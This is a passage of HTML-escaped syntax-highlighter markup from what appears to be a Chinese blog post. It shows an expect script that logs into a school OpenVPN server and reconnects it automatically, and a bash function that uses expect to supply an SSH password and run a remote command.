data-line="crayon-53145a9320449729472440-38"&gt;38&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-39"&gt;39&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-40"&gt;40&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-41"&gt;41&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-42"&gt;42&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-43"&gt;43&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-44"&gt;44&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-45"&gt;45&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-46"&gt;46&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-47"&gt;47&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-48"&gt;48&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320449729472440-49"&gt;49&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320449729472440-50"&gt;50&lt;/div&gt;&lt;/div&gt;

            &lt;/td&gt;

                    &lt;td class="crayon-code"&gt;&lt;div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-1"&gt;&lt;span class="crayon-p"&gt;#!/usr/bin/expect&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-2"&gt;&lt;span class="crayon-p"&gt;#openVPN 59min 自动重连脚本&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-3"&gt;&lt;span class="crayon-p"&gt;#By http://ihipop.info&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-4"&gt;&lt;span class="crayon-p"&gt;#2010-12-26 11:21&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-5"&gt;&amp;nbsp;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-6"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-i"&gt;timeout&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;30&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-7"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-v"&gt;username&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;[&lt;/span&gt;&lt;span class="crayon-i"&gt;lindex&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argv&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;0&lt;/span&gt;&lt;span class="crayon-sy"&gt;]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-8"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-v"&gt;password&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;[&lt;/span&gt;&lt;span class="crayon-i"&gt;lindex&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argv&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;1&lt;/span&gt;&lt;span class="crayon-sy"&gt;]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-9"&gt;&lt;span class="crayon-p"&gt;#set server [lindex $argv 2]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-10"&gt;&lt;span class="crayon-p"&gt;#send_user&amp;nbsp;&amp;nbsp;"UserName is $username\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-11"&gt;&lt;span class="crayon-p"&gt;#send_user "Filename is $argv0 ,and args No.1-2 is :[lrange $argv 1 2] \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-12"&gt;&lt;span class="crayon-p"&gt;#send_user "Total arg num is $argc\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-13"&gt;&lt;span class="crayon-st"&gt;if&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argc&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;!=&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;3&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argc&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;!=&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;2&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-14"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Usage:username password \[server\] \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-15"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"\tthe default server is 211.65.64.1 \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-16"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-17"&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-18"&gt;&lt;span class="crayon-e"&gt;spawn &lt;/span&gt;&lt;span class="crayon-i"&gt;openvpn&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;--&lt;/span&gt;&lt;span class="crayon-e"&gt;config&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;rnas&lt;/span&gt;&lt;span class="crayon-o"&gt;-&lt;/span&gt;&lt;span class="crayon-v"&gt;school&lt;/span&gt;&lt;span class="crayon-e"&gt;.ovpn&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-19"&gt;&lt;span class="crayon-e"&gt;expect&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-20"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Enter Auth Username:"&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-21"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;send&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"$username\r"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-22"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;exp_continue&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-23"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-24"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Enter Auth Password:"&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-25"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-i"&gt;send&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"$password\r"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-26"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-i"&gt;exp_continue&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-27"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-28"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"Initialization Sequence Completed"&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-29"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-p"&gt;#interact&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-30"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-i"&gt;timeout&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;3540&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-31"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-p"&gt;#set timeout 3&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-32"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-i"&gt;exp_continue&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-33"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-34"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"AUTH: Received AUTH_FAILED control message"&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-35"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-p"&gt;#interact&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-36"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"AUTH_FAILED\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-37"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-38"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-39"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-e"&gt;eof&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-40"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"eof\n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-41"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-42"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-43"&gt;&amp;nbsp;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-44"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-e"&gt;timeout&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-45"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-i"&gt;send&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;\&lt;/span&gt;&lt;span class="crayon-cn"&gt;003&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-46"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-i"&gt;send_user&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"timeout \n"&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-47"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-48"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320449729472440-49"&gt;&amp;nbsp;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320449729472440-50"&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;

                &lt;/tr&gt;

            &lt;/table&gt;

        &lt;/div&gt;

    &lt;/div&gt;
</code></pre>

<!-- [Format Time: 0.0075 seconds] -->




<p>上面看到的是把expect脚本单独运行的例子<br />
其实也可以和bash脚本结合的很好<br />
看下面的<a href="http://apt-blog.net/ssh_auto_login_in_shell_script" target="_blank">例子</a></p>


<!-- Crayon Syntax Highlighter v2.5.0 -->


<pre><code>    &lt;div id="crayon-53145a9320456801978064" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;"&gt;



        &lt;div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"&gt;&lt;span class="crayon-title"&gt;&lt;/span&gt;

        &lt;div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"&gt;&lt;div class="crayon-button crayon-nums-button" title="切换显示行编号"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-plain-button" title="纯文本显示代码"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-wrap-button" title="切换自动换行"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-expand-button" title="Expand Code"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-copy-button" title="Copy"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;span class="crayon-language"&gt;Shell&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;

        &lt;div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"&gt;&lt;/div&gt;

        &lt;div class="crayon-plain-wrap"&gt;&lt;textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;"&gt;
</code></pre>

<h1>!/bin/bash</h1>

<p>auto_smart_ssh () {</p>

<pre><code>expect -c "set timeout -1;

            spawn ssh -o StrictHostKeyChecking=no $2 ${@:3};

            expect {

                *assword:* {

                    send $1\r;

                    expect {

                        *denied* {

                            exit 2;

                        }

                        eof

                    }

                }

                eof {

                    exit 1;

                }

            }

            "

return $?
</code></pre>

<p>}</p>

<p>auto_smart_ssh passwd user@host ls /var</p>

<p>echo -e &ldquo;\n&mdash;-Exit Status: $?&rdquo;</textarea></div></p>

<pre><code>        &lt;div class="crayon-main" style=""&gt;

            &lt;table class="crayon-table"&gt;

                &lt;tr class="crayon-row"&gt;

            &lt;td class="crayon-nums " data-settings="show"&gt;

                &lt;div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-1"&gt;1&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-2"&gt;2&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-3"&gt;3&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-4"&gt;4&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-5"&gt;5&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-6"&gt;6&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-7"&gt;7&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-8"&gt;8&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-9"&gt;9&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-10"&gt;10&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-11"&gt;11&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-12"&gt;12&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-13"&gt;13&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-14"&gt;14&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-15"&gt;15&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-16"&gt;16&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-17"&gt;17&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-18"&gt;18&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-19"&gt;19&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-20"&gt;20&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-21"&gt;21&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-22"&gt;22&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320456801978064-23"&gt;23&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320456801978064-24"&gt;24&lt;/div&gt;&lt;/div&gt;

            &lt;/td&gt;

                    &lt;td class="crayon-code"&gt;&lt;div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-1"&gt;&lt;span class="crayon-p"&gt;#!/bin/bash&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-2"&gt;&lt;span class="crayon-e"&gt;auto_smart_ssh&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;(&lt;/span&gt;&lt;span class="crayon-sy"&gt;)&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-3"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;expect&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;-&lt;/span&gt;&lt;span class="crayon-i"&gt;c&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;"&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-i"&gt;timeout&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;-&lt;/span&gt;&lt;span class="crayon-cn"&gt;1&lt;/span&gt;&lt;span class="crayon-sy"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-4"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-e"&gt;spawn &lt;/span&gt;&lt;span class="crayon-i"&gt;ssh&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;-&lt;/span&gt;&lt;span class="crayon-i"&gt;o&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class="crayon-o"&gt;=&lt;/span&gt;&lt;span class="crayon-e"&gt;no&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;$&lt;/span&gt;&lt;span class="crayon-cn"&gt;2&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;$&lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;span class="crayon-sy"&gt;@&lt;/span&gt;&lt;span class="crayon-o"&gt;:&lt;/span&gt;&lt;span class="crayon-cn"&gt;3&lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;span class="crayon-sy"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-5"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-e"&gt;expect&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-6"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-o"&gt;*&lt;/span&gt;&lt;span class="crayon-i"&gt;assword&lt;/span&gt;&lt;span class="crayon-o"&gt;:&lt;/span&gt;&lt;span class="crayon-o"&gt;*&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-7"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;send&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;$&lt;/span&gt;&lt;span class="crayon-cn"&gt;1&lt;/span&gt;&lt;span class="crayon-sy"&gt;\&lt;/span&gt;&lt;span class="crayon-i"&gt;r&lt;/span&gt;&lt;span class="crayon-sy"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-8"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-e"&gt;expect&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-9"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-o"&gt;*&lt;/span&gt;&lt;span class="crayon-e"&gt;denied&lt;/span&gt;&lt;span class="crayon-o"&gt;*&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span 